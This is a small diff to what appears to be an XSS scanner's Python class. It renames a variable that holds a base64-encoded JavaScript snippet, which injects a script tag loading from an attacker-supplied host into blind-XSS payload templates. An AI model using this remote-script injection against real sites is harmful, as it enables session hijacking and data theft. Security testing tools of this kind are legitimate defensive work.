@@ -51,7 +51,7 @@ class XSS:
         self.blind_payloads = open(f"{base_dir}/db/txt/bxss.txt", "r")
         self.blind = []
         if host:
-            b = (
+            b64_jsvalue = (
                 b64encode(
                     f'var a=document.createElement("script");a.src="{host}";document.body.appendChild(a);'.encode(
                         "utf-8"
@@ -62,6 +62,6 @@ class XSS:
             )
             for blind_payload in self.blind_payloads:
                 new_payload = blind_payload.replace("{host}", host).replace(
-                    "{b64_host}", b
+                    "{b64_host}", b64_jsvalue
                 )
                 self.payloads.append(new_payload)
